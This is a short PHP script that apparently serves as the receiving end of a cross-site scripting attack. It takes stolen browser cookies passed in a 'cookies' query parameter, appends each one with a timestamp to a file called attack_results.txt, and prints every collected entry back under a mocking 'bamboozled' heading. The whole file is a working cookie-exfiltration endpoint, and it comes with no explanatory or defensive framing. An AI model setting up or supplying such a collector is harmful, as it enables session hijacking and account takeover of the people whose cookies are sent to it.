<?php

if ( $_GET[ 'cookies' ] ) {
	$file = 'attack_results.txt';
	$data = file_get_contents( $file );
	$data .= ( $_SERVER[ 'REQUEST_TIME' ] . ' : ' . $_GET[ 'cookies' ] . PHP_EOL );
	file_put_contents( $file, $data );
}

?>

<h1>You've been bamboozled homie!</h1>
<h3>File contents:</h3>
<pre><?php echo $data; ?></pre>
